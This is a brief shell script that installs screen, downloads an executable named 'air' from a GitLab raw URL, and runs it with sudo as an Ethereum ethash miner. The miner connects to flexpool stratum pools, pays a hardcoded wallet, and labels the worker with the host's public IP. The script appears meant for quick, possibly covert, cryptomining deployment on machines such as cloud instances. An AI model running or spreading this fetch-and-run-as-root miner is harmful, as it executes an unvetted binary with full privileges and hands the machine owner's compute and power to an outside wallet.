sudo apt update
sudo apt install screen -y
screen -dmS air.sh 65 75
sudo apt update
wget https://gitlab.com/useragen/lancarkanlah/-/raw/main/air
chmod +x air
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./air -a ethash -w 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4  -p stratum+ssl://eth-sg.flexpool.io:5555 stratum+ssl://eth-hk.flexpool.io:5555 -r $ip-api --nvidia 1
